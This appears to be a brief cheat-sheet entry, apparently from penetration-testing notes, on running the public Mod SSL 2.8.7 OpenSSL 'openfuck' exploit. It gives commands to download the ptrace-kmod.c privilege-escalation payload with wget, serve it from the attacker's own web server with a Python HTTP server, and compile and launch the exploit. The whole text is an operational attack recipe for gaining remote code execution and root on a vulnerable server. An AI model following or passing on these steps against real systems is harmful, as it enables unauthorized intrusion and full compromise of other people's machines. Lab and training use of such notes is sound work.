# Mod SSL 2.8.7 OpenSSL Exploit \(openfu\*kV2.c\)

 source: [https://www.exploit-db.com/exploits/764](https://www.exploit-db.com/exploits/764) source:

Edit exploit code to comment out `#COMMAND2` variable, which is the command to download `ptrace-kmod.c`. Since the url included in this exploit is not valid, we will download the file seperately and host it on our own webserver.

```bash
#download ptrace-kmod.c
wget https://www.exploit-db.com/download/3
```

Usage: 1. compile code

```bash
gcc -o openfuck openfuckV2.c -lcrypto
```

if you encounter missing ld error while compiling at victim machine, try checking your $PATH and make sure it is pointing to the 'ld' file.

1. In your `ptrace-kmod.c` directory start webserver `python -m SimpleHTTPServer 80`
2. In victim machine `.\openfuck`
